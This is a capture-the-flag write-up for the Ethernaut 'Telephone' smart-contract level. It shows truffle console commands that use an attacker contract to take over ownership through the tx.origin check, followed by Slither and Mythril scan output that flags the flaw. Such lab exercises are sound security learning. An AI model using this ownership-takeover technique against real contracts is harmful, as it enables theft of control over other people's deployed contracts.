# Telephone

[Telephone](https://ethernaut.openzeppelin.com/level/0x1ca9f1c518ec5681C2B7F97c7385C0164c3A22Fe)

Contract requires us to generate transaction for which `tx.origin != msg.sender`.

<BR />

## Live Attack
```BASH
truffle console --network goerli
```

```JS
//Identify the account index
// 0xCbB9660eA60B895443ef5001B968b6Ae4c0AaA18
accounts
sender = accounts[5]

telephone = await Telephone.at('0x345E615311dee8FF11889FF57ED615Db3905f776')
telephone.owner()
telephone.address

attack = await TelephoneAttack.deployed()
attack.target()
await attack.changeOwner({from: sender})

telephone.owner()
```

<BR />


## Vulnerability Testing Tools

<BR />

### Slither

Not Detected

```BASH
slither ./contracts/Telephone.sol  --truffle-ignore-compile --exclude-optimization
```

```
Telephone.changeOwner(address)._owner (contracts/Telephone.sol#12) lacks a zero-check on :
                - owner = _owner (contracts/Telephone.sol#14)
Reference: https://github.com/crytic/slither/wiki/Detector-Documentation#missing-zero-address-validation

Pragma version^0.8.0 (contracts/Telephone.sol#2) allows old versions
solc-0.8.9 is not recommended for deployment
Reference: https://github.com/crytic/slither/wiki/Detector-Documentation#incorrect-versions-of-solidity

Parameter Telephone.changeOwner(address)._owner (contracts/Telephone.sol#12) is not in mixedCase
Reference: https://github.com/crytic/slither/wiki/Detector-Documentation#conformance-to-solidity-naming-conventions
./contracts/Telephone.sol analyzed (1 contracts with 76 detectors), 4 result(s) found
```

<BR />

### Mythril

__Bug Detected__

```BASH
docker run --rm `
        -v /c/temp/QuickTest/blockchain-ctf/ethernaut/02_telephone:/share `
        mythril/myth `
        analyze /share/contracts/Telephone.sol `
        --solv 0.8.0
```

```
==== Dependence on tx.origin ====
SWC ID: 115
Severity: Low
Contract: Telephone
Function name: changeOwner(address)
PC address: 204
Estimated Gas Usage: 466 - 561
Use of tx.origin as a part of authorization control.
The tx.origin environment variable has been found to influence a control flow decision. Note that using tx.origin as a security control might cause a situation where a user inadvertently authorizes a smart contract to perform an action on their behalf. It is recommended to use msg.sender instead.
--------------------
In file: /share/contracts/Telephone.sol:13

if (tx.origin != msg.sender) {
      owner = _owner;
    }

--------------------
Initial State:

Account: [CREATOR], balance: 0x0, nonce:0, storage:{}
Account: [ATTACKER], balance: 0x0, nonce:0, storage:{}

Transaction Sequence:

Caller: [CREATOR], calldata: , decoded_data: , value: 0x0
Caller: [CREATOR], function: changeOwner(address), txdata: 0xa6f9dae10000000000000000000000000000000000000000000000000000000000000000, decoded_data: ('0x0000000000000000000000000000000000000000',), value: 0x0
```
